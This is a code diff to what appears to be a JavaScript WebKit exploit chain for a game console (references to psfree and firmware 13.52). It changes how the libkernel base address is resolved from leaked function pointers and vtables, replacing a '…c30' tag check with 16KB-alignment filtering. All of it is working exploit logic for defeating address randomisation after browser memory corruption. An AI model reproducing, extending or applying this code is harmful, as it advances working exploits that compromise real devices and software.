@@ -88,6 +88,7 @@ export function loadSessionOffsets(baseOff) {
         const cand = parseInt(sessionStorage.getItem(SS_CAL_CANDIDATE) || "0", 16);
         if (cand > 0) off.wk_expm1_builtin = cand;
     } catch (_) { }
+    delete off.lk_base_tag;
     return off;
 }
 
@@ -413,12 +414,13 @@ function extEntryCodeNum(entry) {
     return Number.isFinite(n) ? (n >>> 0) : null;
 }
 
-function lkLoTag(lk) {
+function lkLoSuffix(lk) {
     if (!lk) return "????";
-    return ((lk.low >>> 0) & 0xfff).toString(16);
+    if ((lk.low & 0x3fff) === 0) return "16K";
+    return "…" + ((lk.low >>> 0) & 0xfff).toString(16);
 }
 
-/** Per ext fn ptr: which RVAs yield …c30 / 16KB lk (0 reads). For logging + debug. */
+/** Per ext fn ptr: which RVAs yield 16KB-aligned lk (0 reads). For logging + debug. */
 export function diagnoseExtPtrLkMatches(entries, off, webkitBase) {
     off = off || {};
     const out = [];
@@ -462,7 +464,7 @@ export function diagnoseExtPtrLkMatches(entries, off, webkitBase) {
                 key: z.key,
                 rva: z.rva,
                 lk: String(z.lk),
-                lkTag: lkLoTag(z.lk),
+                lkTag: lkLoSuffix(z.lk),
                 via: z.via,
             });
         }
@@ -476,7 +478,7 @@ export function formatExtPtrDiagLine(d) {
     if (d.skipped)
         return d.label + " fn=0x" + (d.hex || "?") + " SKIP " + (d.skipReason || "?");
     if (!d.matches.length)
-        return d.label + " fn=0x" + d.hex + " — no RVA → …c30 lk";
+        return d.label + " fn=0x" + d.hex + " — no RVA → 16KB lk";
     const parts = [];
     for (let i = 0; i < d.matches.length && i < 6; i++) {
         const m = d.matches[i];
@@ -528,7 +530,7 @@ export function collectLiveVtableExtPtrs(p, webkitBase, off, opts) {
 /**
  * Auto-resolve libkernel from ext fn ptrs — **0 reads @ candidate lk** (wrong lk OOMs on 13.52).
  * 1) Suchi RVA subtract + vote across ptrs
- * 2) verifyLibkernelZeroRead (…c30 tag only — no prologue peek)
+ * 2) verifyLibkernelZeroRead (16KB-aligned base — no prologue peek)
  * Requires ≥2 distinct ext ptrs agreeing on same lk unless opts.minVotes=1.
  * Header-walk / prologue verify only if opts.allowLkReads===true (unsafe).
  */
@@ -713,9 +715,7 @@ export function resolveLibkernelFromExtList(p, webkitBase, off, entries, opts) {
         }
     }
 
-    let hint = "need 2+ distinct ext fn ptrs → same …"
-        + (lkBaseTag(off) != null ? lkBaseTag(off).toString(16) : "c30")
-        + ", OR usleep ptr + error ptr → same lk (0 reads)";
+    let hint = "need 2+ distinct ext fn ptrs → same 16KB-aligned lk (0 reads)";
     const matchedPtrs = ptrDiag.filter(function (d) { return !d.skipped && d.matches.length; });
     if (matchedPtrs.length === 1) {
         const m = matchedPtrs[0];
@@ -1349,7 +1349,7 @@ function lkFromFnPtrPsfree(p, fnPtr, off, pltRva, webkitBase) {
         const errs = kErrorCandidates(off);
         for (let i = 0; i < errs.length; i++) {
             const lk = fnPtr.sub32(errs[i]);
-            if (lkBaseTag(off) != null && looksLikeLkBase(lk, off))
+            if (looksLikeLkBase(lk, off))
                 return { lk, iatRva: pltRva, via: "error+" + errs[i].toString(16), fnPtr };
             if (lkAligned(lk) && isLibkernelPrologue(p, lk))
                 return { lk, iatRva: pltRva, via: "error+" + errs[i].toString(16), fnPtr };
@@ -2436,23 +2436,14 @@ export function libkernelRvaTable(off) {
     return out;
 }
 
-function lkBaseTag(off) {
-    return off && off.lk_base_tag != null ? (off.lk_base_tag & 0xfff) : null;
-}
-
-/** 13.52 lk: Okage …c30 OR 16KB-aligned (e.g. BillZai/WebKit @ 0x80a67c000). */
 function looksLikeLkBase(lk, off) {
     if (!lk || lk.hi < 0x8 || lk.hi > 0x12) return false;
-    const tag = lkBaseTag(off);
-    if (tag != null && ((lk.low >>> 0) & 0xfff) === tag) return true;
-    if ((lk.low & 0x3fff) === 0) return true;
-    if (tag == null) return lkAligned(lk);
-    return false;
+    return lkAligned(lk);
 }
 
 /**
  * lk = fnPtr − RVA — pure math, 0 reads.
- * Filters by 13.52 lk_base …c30 tag when off.lk_base_tag is set.
+ * Keeps candidates that are 16KB-aligned (WebKit libkernel_sys mapping).
  */
 export function calcLkFromFnPtrZeroRead(fnPtr, off) {
     if (!fnPtr || fnPtr.hi < 0x8) return [];
@@ -2541,11 +2532,11 @@ export function resolveLkOnePltStep(p, webkitBase, off, opts) {
     }
     return {
         ok: false, pltRva, idx, total: cands.length,
-        fnPtr: fn, error: "fn−RVA miss (not …c30)",
+        fnPtr: fn, error: "fn−RVA miss (not 16KB-aligned lk)",
     };
 }
 
-/** Accept lk from Suchi RVA math / …c30 tag — 0 reads (peek @ lk OOMs on poops). */
+/** Accept lk from Suchi RVA math / 16KB alignment — 0 reads (peek @ lk OOMs on poops). */
 export function verifyLibkernelZeroRead(lk, off, opts) {
     off = off || {};
     opts = opts || {};
@@ -2553,13 +2544,10 @@ export function verifyLibkernelZeroRead(lk, off, opts) {
     if (lk.hi < 0x8 || lk.hi > 0x12)
         return { ok: false, error: "hi out of userland range" };
     if (!looksLikeLkBase(lk, off)) {
-        const tag = lkBaseTag(off);
         const lo12 = (lk.low >>> 0) & 0xfff;
         return {
             ok: false,
-            error: tag != null
-                ? "want …" + tag.toString(16) + " or 16KB-aligned, got …" + lo12.toString(16)
-                : "not lk-aligned",
+            error: "want 16KB-aligned lk (…000), got …" + lo12.toString(16),
         };
     }
     return {
